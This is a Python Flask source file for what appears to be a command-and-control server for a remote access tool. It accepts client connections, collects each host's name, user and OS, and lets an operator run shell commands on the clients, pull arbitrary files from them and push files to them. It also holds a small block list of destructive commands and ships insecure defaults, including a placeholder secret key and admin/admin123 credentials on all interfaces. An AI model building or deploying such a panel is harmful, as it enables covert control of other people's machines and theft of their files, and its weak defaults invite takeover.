from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for, session, flash
from werkzeug.utils import secure_filename
from werkzeug.security import check_password_hash, generate_password_hash
import socket
import threading
import json
import os
import time
import logging
from datetime import datetime
import uuid
import subprocess
import shlex
from pathlib import Path

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this-in-production'  # Change this in production!

# Configuration
UPLOAD_FOLDER = 'uploads'
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB max file size
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'zip', 'rar'}
SERVER_PORT = 9999
WEB_PORT = 5000

# Default admin credentials (change these!)
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD_HASH = generate_password_hash('admin123')  # Change this password!

# Global variables for client management
connected_clients = {}
client_logs = {}
server_socket = None
server_running = False

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Ensure upload directory exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def sanitize_input(input_string):
    """Basic input sanitization"""
    if not input_string:
        return ""
    # Remove potentially dangerous characters
    dangerous_chars = ['<', '>', '&', '"', "'", '`', ';', '|', '&', '$']
    for char in dangerous_chars:
        input_string = input_string.replace(char, '')
    return input_string.strip()

def log_client_activity(client_id, message):
    """Log client activity"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {message}"
    
    if client_id not in client_logs:
        client_logs[client_id] = []
    
    client_logs[client_id].append(log_entry)
    
    # Keep only last 1000 log entries per client
    if len(client_logs[client_id]) > 1000:
        client_logs[client_id] = client_logs[client_id][-1000:]

class ClientHandler:
    def __init__(self, client_socket, client_address):
        self.socket = client_socket
        self.address = client_address
        self.client_id = str(uuid.uuid4())
        self.info = {
            'id': self.client_id,
            'address': f"{client_address[0]}:{client_address[1]}",
            'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'computer_name': 'Unknown',
            'username': 'Unknown',
            'os': 'Unknown',
            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.running = True
        
        connected_clients[self.client_id] = self
        log_client_activity(self.client_id, f"Client connected from {self.address}")

    def handle_client(self):
        try:
            while self.running:
                data = self.socket.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                
                self.info['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                for line in data.strip().split('\n'):
                    if line:
                        self.process_message(line)
                        
        except Exception as e:
            log_client_activity(self.client_id, f"Error handling client: {str(e)}")
        finally:
            self.disconnect()

    def process_message(self, message):
        log_client_activity(self.client_id, f"Received: {message}")
        
        if message.startswith('CLIENT_INFO:'):
            # Format: CLIENT_INFO:computer_name:username:os
            parts = message.split(':', 3)
            if len(parts) >= 4:
                self.info['computer_name'] = parts[1]
                self.info['username'] = parts[2]
                self.info['os'] = parts[3]
                log_client_activity(self.client_id, f"Client info updated: {parts[1]}/{parts[2]} ({parts[3]})")
        
        elif message.startswith('RESULT:'):
            result = message[7:]  # Remove 'RESULT:' prefix
            log_client_activity(self.client_id, f"Command result: {result[:200]}...")
        
        elif message.startswith('FILE_UPLOAD:'):
            # Format: FILE_UPLOAD:filename:size
            parts = message.split(':', 2)
            if len(parts) >= 3:
                filename = secure_filename(parts[1])
                file_size = int(parts[2])
                self.receive_file(filename, file_size)
        
        elif message.startswith('DOWNLOAD_COMPLETE:'):
            filename = message[18:]  # Remove 'DOWNLOAD_COMPLETE:' prefix
            log_client_activity(self.client_id, f"Download completed: {filename}")
        
        elif message.startswith('ERROR:'):
            error = message[6:]  # Remove 'ERROR:' prefix
            log_client_activity(self.client_id, f"Error: {error}")
        
        elif message == 'PONG':
            log_client_activity(self.client_id, "Ping response received")

    def receive_file(self, filename, file_size):
        try:
            # Create client-specific upload directory
            client_dir = os.path.join(UPLOAD_FOLDER, self.client_id)
            os.makedirs(client_dir, exist_ok=True)
            
            filepath = os.path.join(client_dir, filename)
            
            with open(filepath, 'wb') as f:
                received = 0
                while received < file_size:
                    chunk = self.socket.recv(min(4096, file_size - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            
            log_client_activity(self.client_id, f"File received: {filename} ({received} bytes)")
            
        except Exception as e:
            log_client_activity(self.client_id, f"Error receiving file {filename}: {str(e)}")

    def send_command(self, command):
        try:
            self.socket.send(f"{command}\n".encode('utf-8'))
            log_client_activity(self.client_id, f"Sent command: {command}")
            return True
        except Exception as e:
            log_client_activity(self.client_id, f"Error sending command: {str(e)}")
            return False

    def send_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return False
            
            filename = os.path.basename(filepath)
            file_size = os.path.getsize(filepath)
            
            # Send download command
            command = f"DOWNLOAD:{filename}:{file_size}"
            self.socket.send(f"{command}\n".encode('utf-8'))
            
            # Send file data
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.socket.send(chunk)
            
            log_client_activity(self.client_id, f"File sent: {filename} ({file_size} bytes)")
            return True
            
        except Exception as e:
            log_client_activity(self.client_id, f"Error sending file: {str(e)}")
            return False

    def disconnect(self):
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        
        if self.client_id in connected_clients:
            del connected_clients[self.client_id]
        
        log_client_activity(self.client_id, "Client disconnected")

def start_server():
    global server_socket, server_running
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind(('0.0.0.0', SERVER_PORT))
        server_socket.listen(10)
        server_running = True
        
        logger.info(f"Server listening on port {SERVER_PORT}")
        
        while server_running:
            try:
                client_socket, client_address = server_socket.accept()
                client_handler = ClientHandler(client_socket, client_address)
                
                # Start client handler in a separate thread
                client_thread = threading.Thread(target=client_handler.handle_client)
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if server_running:
                    logger.error(f"Error accepting client connection: {str(e)}")
                
    except Exception as e:
        logger.error(f"Error starting server: {str(e)}")
    finally:
        server_running = False
        if server_socket:
            server_socket.close()

# Authentication decorator
def login_required(f):
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

# Web Routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = sanitize_input(request.form['username'])
        password = request.form['password']
        
        if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
            session['logged_in'] = True
            session['username'] = username
            flash('Login successful', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out successfully', 'success')
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    return render_template('dashboard.html', clients=connected_clients)

@app.route('/api/clients')
@login_required
def api_clients():
    client_list = []
    for client_id, client in connected_clients.items():
        client_list.append(client.info)
    return jsonify(client_list)

@app.route('/api/client/<client_id>/command', methods=['POST'])
@login_required
def api_send_command(client_id):
    if client_id not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    command = sanitize_input(request.json.get('command', ''))
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    # Basic command injection prevention
    dangerous_commands = ['rm -rf', 'format', 'del /s', 'shutdown', 'reboot']
    command_lower = command.lower()
    for dangerous in dangerous_commands:
        if dangerous in command_lower:
            return jsonify({'error': 'Dangerous command not allowed'}), 403
    
    client = connected_clients[client_id]
    if client.send_command(f"EXECUTE:{command}"):
        return jsonify({'success': True})
    else:
        return jsonify({'error': 'Failed to send command'}), 500

@app.route('/api/client/<client_id>/upload', methods=['POST'])
@login_required
def api_upload_file(client_id):
    if client_id not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        
        # Save file temporarily
        temp_path = os.path.join('/tmp', filename)
        file.save(temp_path)
        
        # Send file to client
        client = connected_clients[client_id]
        if client.send_file(temp_path):
            os.remove(temp_path)  # Clean up temp file
            return jsonify({'success': True})
        else:
            os.remove(temp_path)  # Clean up temp file
            return jsonify({'error': 'Failed to send file'}), 500
    
    return jsonify({'error': 'Invalid file type'}), 400

@app.route('/api/client/<client_id>/request_file', methods=['POST'])
@login_required
def api_request_file(client_id):
    if client_id not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    filepath = sanitize_input(request.json.get('filepath', ''))
    if not filepath:
        return jsonify({'error': 'File path is required'}), 400
    
    client = connected_clients[client_id]
    if client.send_command(f"UPLOAD:{filepath}"):
        return jsonify({'success': True})
    else:
        return jsonify({'error': 'Failed to request file'}), 500

@app.route('/api/client/<client_id>/logs')
@login_required
def api_client_logs(client_id):
    logs = client_logs.get(client_id, [])
    return jsonify(logs)

@app.route('/api/client/<client_id>/files')
@login_required
def api_client_files(client_id):
    client_dir = os.path.join(UPLOAD_FOLDER, client_id)
    files = []
    
    if os.path.exists(client_dir):
        for filename in os.listdir(client_dir):
            filepath = os.path.join(client_dir, filename)
            if os.path.isfile(filepath):
                files.append({
                    'name': filename,
                    'size': os.path.getsize(filepath),
                    'modified': datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
                })
    
    return jsonify(files)

@app.route('/api/client/<client_id>/download/<filename>')
@login_required
def api_download_file(client_id, filename):
    filename = secure_filename(filename)
    filepath = os.path.join(UPLOAD_FOLDER, client_id, filename)
    
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404

@app.route('/api/client/<client_id>/disconnect', methods=['POST'])
@login_required
def api_disconnect_client(client_id):
    if client_id not in connected_clients:
        return jsonify({'error': 'Client not found'}), 404
    
    client = connected_clients[client_id]
    client.send_command("DISCONNECT")
    client.disconnect()
    
    return jsonify({'success': True})

if __name__ == '__main__':
    # Start the client server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    print(f"Client server started on port {SERVER_PORT}")
    print(f"Web interface will be available at http://localhost:{WEB_PORT}")
    print(f"Default login: admin / admin123")
    
    # Start Flask web server
    app.run(host='0.0.0.0', port=WEB_PORT, debug=False)